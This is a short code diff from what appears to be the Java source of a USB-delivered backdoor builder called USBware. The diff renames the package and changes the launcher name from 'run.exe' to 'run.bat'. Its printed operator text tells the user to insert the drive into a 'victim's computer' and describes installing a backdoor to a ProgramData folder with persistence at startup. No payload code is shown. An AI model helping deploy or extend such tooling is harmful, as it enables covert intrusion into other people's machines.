@@ -1,4 +1,4 @@
-package thatcherdev.usbware.usbware;
+package com.github.thatcherdev.usbware.usbware;
 
 import java.io.File;
 import java.nio.file.Paths;
@@ -71,10 +71,10 @@ public class USBware {
 		try{
 			Thread.sleep(2000);
 		}catch(InterruptedException e){}
-		System.out.println("Insert this USB drive into victim's computer and execute 'run.exe'\nThis will:\n");
+		System.out.println("Insert this USB drive into victim's computer and execute 'run.bat'\nThis will:\n");
 		if(choice2.equals("0"))
 			System.out.println(
-				"-Install the backdoor to 'C:\\ProgramData\\USBDrivers'\n-Add the backdoor to startup (if 'run.exe' executed as administrator)\n-Run the backdoor\n-Display information for controlling the backdoor\n");
+				"-Install the backdoor to 'C:\\ProgramData\\USBDrivers'\n-Add the backdoor to startup (if 'run.bat' executed as administrator)\n-Run the backdoor\n-Display information for controlling the backdoor\n");
 		else if(choice2.equals("1"))
 			System.out.println("-Run the backdoor\n-Display information for controlling the backdoor\n");
 		System.out.println("Press ENTER to exit...");
